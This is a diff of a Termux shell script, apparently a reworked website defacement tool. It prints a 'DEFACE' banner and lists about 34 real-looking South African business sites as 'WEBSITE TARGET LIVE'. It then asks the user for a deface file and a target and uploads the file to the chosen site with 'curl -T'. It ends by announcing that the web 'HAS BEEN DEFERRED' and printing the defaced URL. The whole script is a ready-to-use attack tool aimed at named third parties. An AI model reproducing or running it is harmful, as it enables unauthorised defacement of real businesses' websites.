@@ -1,64 +1,73 @@
-!/usr/bin/shell
+#!/usr/bin/shell
 # Life Of Programmer
-# Coded By The Sixty Nine
+# Recode By Nedi Senja
 
 clear
 reset
-
+sleep 1
 echo
 
-lolcat /storage/emulated/0/Termux/deface.txt
-
+printf "
+\033[2;96m     ██████╗ ███████╗███████╗ █████╗  ██████╗███████╗
+\033[2;96m     ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝
+\033[2;96m     ██║  ██║█████╗  █████╗  ███████║██║     █████╗
+\033[0;77m     ██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝
+\033[0;77m     ██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗
+\033[0;77m     ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝
+"
+sleep 1
 echo
-echo "\033[1;32m                   * Coded by The Sixty Nine"
+echo "\033[1;32m                  * Recode by Nedi Senja"
 echo
-echo "          \033[0m\033[101m:       # WEBSITE TARGET LIVE #       :\033[0m\033[1;77m"
-sleep 2
-echo "          ║                                     ║"
-echo "          ║ http://contsol.co.za/               ║"
-echo "          ║ http://colourfactory.co.za/         ║"
-echo "          ║ http://chillibitez.co.za/           ║"
-echo "          ║ http://chasingfantasia.com/         ║"
-echo "          ║ http://centraltech.co.za/           ║"
-echo "          ║ http://cblandscapes.co.za/          ║"
-echo "          ║ http://bee-it.co.za/                ║"
-echo "          ║ http://butterflowers.co.za/         ║"
-echo "          ║ http://bananabox.co.za/             ║"
-echo "          ║ http://ayk.co.za/                   ║"
-echo "          ║ http://ads247.co.za/                ║"
-echo "          ║ http://allpaint.co.za/              ║"
-echo "          ║ http://atlanticphysio.co.za/        ║"
-echo "          ║ http://valdicare.co.za/             ║"
-echo "          ║ http://vmicl.co.za/                 ║"
-echo "          ║ http://troon.co.za/                 ║"
-echo "          ║ http://nyarhi.co.za/                ║"
-echo "          ║ http://nitrobikes.co.za/            ║"
-echo "          ║ http://nhisa.co.za/                 ║"
-echo "          ║ http://netcallcollect.co.za/        ║"
-echo "          ║ http://naturaleyeimages.com/        ║"
-echo "          ║ http://mpark.co.za/                 ║"
-echo "          ║ http://moneyin1week.co.za/          ║"
-echo "          ║ http://mix007.co.za/                ║"
-echo "          ║ http://mediacube.co.za/             ║"
-echo "          ║ http://megro.co.za/                 ║"
-echo "          ║ http://menogold.co.za/              ║"
-echo "          ║ http://mestern.co.za/               ║"
-echo "          ║ http://tcmgroup.co.za/              ║"
-echo "          ║ http://sublimeconfectionery.co.za/  ║"
-echo "          ║ http://tieronecapital.co.za/        ║"
-echo "          ║ http://thegiftstore.co.za/          ║"
-echo "          ║ http://thefoundation.co.za/         ║"
-echo "          ║ http://tressor.co.za/               ║"
-echo "          ╚═════════════════════════════════════╝"
-sleep 2
+echo "          \033[0m\033[97;45;1m:       # WEBSITE TARGET LIVE #       :\033[0m\033[1;77m"
+sleep 1
+echo "          \033[0;35m║                                     \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://contsol.co.za/               \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://colourfactory.co.za/         \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://chillibitez.co.za/           \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://chasingfantasia.com/         \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://centraltech.co.za/           \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://cblandscapes.co.za/          \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://bee-it.co.za/                \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://butterflowers.co.za/         \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://bananabox.co.za/             \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://ayk.co.za/                   \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://ads247.co.za/                \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://allpaint.co.za/              \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://atlanticphysio.co.za/        \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://valdicare.co.za/             \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://vmicl.co.za/                 \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://troon.co.za/                 \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://nyarhi.co.za/                \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://nitrobikes.co.za/            \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://nhisa.co.za/                 \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://netcallcollect.co.za/        \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://naturaleyeimages.com/        \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://mpark.co.za/                 \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://moneyin1week.co.za/          \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://mix007.co.za/                \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://mediacube.co.za/             \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://megro.co.za/                 \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://menogold.co.za/              \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://mestern.co.za/               \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://tcmgroup.co.za/              \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://sublimeconfectionery.co.za/  \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://tieronecapital.co.za/        \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://thegiftstore.co.za/          \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://thefoundation.co.za/         \033[0;35m║"
+echo "          \033[0;35m║ \033[0;1;77mhttp://tressor.co.za/               \033[0;35m║"
+echo "          \033[0;35m╚═════════════════════════════════════╝"
+sleep 1
 
-echo "\033[1;33m "
-read -p "Enter your Script Deface Name : " script
-read -p "Paste One of The Web Above : " target
+echo "\033[0;1;77m "
+read -p "[/] Enter your Script Deface Name : " script
+read -p "[+] Paste One of The Web Above : " target
 curl -T /storage/emulated/0/$script $target
 echo
 echo
-echo "\033[1;34m[\033[1;37m√\033[1;34m]\033[1;32m THE WEB HAS BEEN DEFERRED \033[1;34m[\033[1;37m√\033[1;34m]"
-echo "\033[1;34m[\033[1;37m*\033[1;34m]\033[1;35m PLEASE LOOK AT MY BOSS \033[1;31m  ===>\033[1;37m $target$script"
+echo "\033[1;34m[\033[0;1;77m√\033[1;34m]\033[0;33m THE WEB HAS BEEN DEFERRED \033[1;34m[\033[0;1;77m√\033[1;34m]"
+echo "\033[1;34m[\033[0;1;77m*\033[1;34m]\033[0;36m PLEASE LOOK AT MY BOSS \033[1;31m===>\033[1;37m $target$script"
 echo
 echo
+exit 1
+sleep 1
